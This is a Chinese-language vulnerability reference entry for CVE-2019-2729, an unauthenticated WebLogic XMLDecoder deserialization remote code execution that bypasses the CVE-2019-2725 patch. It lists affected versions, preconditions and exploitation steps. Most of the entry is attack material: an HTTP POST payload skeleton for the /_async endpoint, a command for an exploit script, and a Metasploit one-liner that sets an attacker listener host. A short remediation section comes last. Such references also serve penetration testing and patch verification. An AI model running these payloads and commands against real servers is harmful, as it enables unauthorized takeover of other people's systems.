Vuln/middleware/weblogic/CVE-2019-2729.md

---
id: CVE-2019-2729
title: WebLogic XMLDecoder 反序列化远程代码执行（CVE-2019-2729）
product: weblogic
vendor: Oracle
version_affected: "10.3.6, 12.1.3, 12.2.1.3"
severity: CRITICAL
tags: [rce, deserialization, xmldecoder, 无需认证]
fingerprint: ["Oracle WebLogic", "WebLogic"]
---

## 漏洞描述

CVE-2019-2729 是对 CVE-2019-2725 补丁的绕过。通过构造新的 XMLDecoder 反序列化 payload 绕过黑名单过滤，实现未授权远程代码执行。攻击路径与 CVE-2019-2725 相同（`/_async/AsyncResponseService` 和 `/wls-wsat/CoordinatorPortType`）。

## 影响版本

- Oracle WebLogic 10.3.6
- Oracle WebLogic 12.1.3
- Oracle WebLogic 12.2.1.3

## 前置条件

- 无需认证
- wls-wsat 或 _async 组件已启用
- WebLogic 端口可达（默认 7001）

## 利用步骤

1. 确认 wls-wsat 或 _async 组件存在
2. 发送 XMLDecoder payload 绕过补丁

## Payload

```http
POST /_async/AsyncResponseService HTTP/1.1
Host: target:7001
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:wsa="http://www.w3.org/2005/08/addressing"
  xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
          <void>
            <array class="byte" length="4096">
              <!-- 此处放置序列化 payload 的字节 -->
            </array>
          </void>
        </class>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body>
    <asy:onAsyncDelivery/>
  </soapenv:Body>
</soapenv:Envelope>
```

```bash
# 使用集成工具
python3 CVE-2019-2729.py -u http://target:7001 -c "id"
```



Metasploit 利用（CVE-2019-2725 的绕过，使用相同 MSF 模块）:
```bash
msfconsole -q -x "use exploit/multi/http/oracle_weblogic_deserialize_badattr; set RHOSTS target; set RPORT 7001; set LHOST attacker_ip; run"
```

## 验证方法

```bash
# 检查组件是否存在
curl -s http://target:7001/_async/AsyncResponseService
curl -s http://target:7001/wls-wsat/CoordinatorPortType
```

## 修复建议

- 升级至 Oracle 2019年6月补丁
- 删除 wls-wsat 和 _async 组件
